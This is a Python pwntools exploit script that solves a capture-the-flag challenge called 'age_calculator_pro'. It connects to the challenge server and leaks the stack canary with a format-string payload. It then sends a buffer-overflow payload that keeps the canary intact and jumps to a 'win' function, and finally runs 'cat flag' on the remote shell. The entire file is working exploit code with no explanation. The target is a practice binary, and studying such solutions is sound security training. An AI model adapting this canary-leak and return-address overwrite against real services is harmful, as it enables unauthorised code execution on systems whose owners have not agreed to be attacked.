#!/usr/bin/env python3

import logging
import os
import time
from pwn import *

logging.disable()

# For TCP connection
HOST = os.environ.get("HOST", "agecalculatorpro.challs.olicyber.it")
PORT = int(os.environ.get("PORT", 38103))

exe = context.binary = ELF(os.path.join(os.path.dirname(__file__), 'age_calculator_pro'))

io = remote(HOST, PORT)

format_string = b"%p." * 20
io.sendlineafter(b"What's your name?\n", format_string)
res = io.recvuntil(b"what's your birth year?", drop=True)
canary = int(res.split(b'.')[16], 16)
print(f"[+] canary: {hex(canary)}")

payload = b"A" * 0x48
payload += p64(canary)
payload += p64(0x0)
payload += p64(exe.sym.win)
res = io.sendline(payload)
io.recvuntil(B"years old!\n")
time.sleep(0.5)
io.sendline(b"cat flag")
res = io.clean(0.5)
io.close()
print(res.decode())
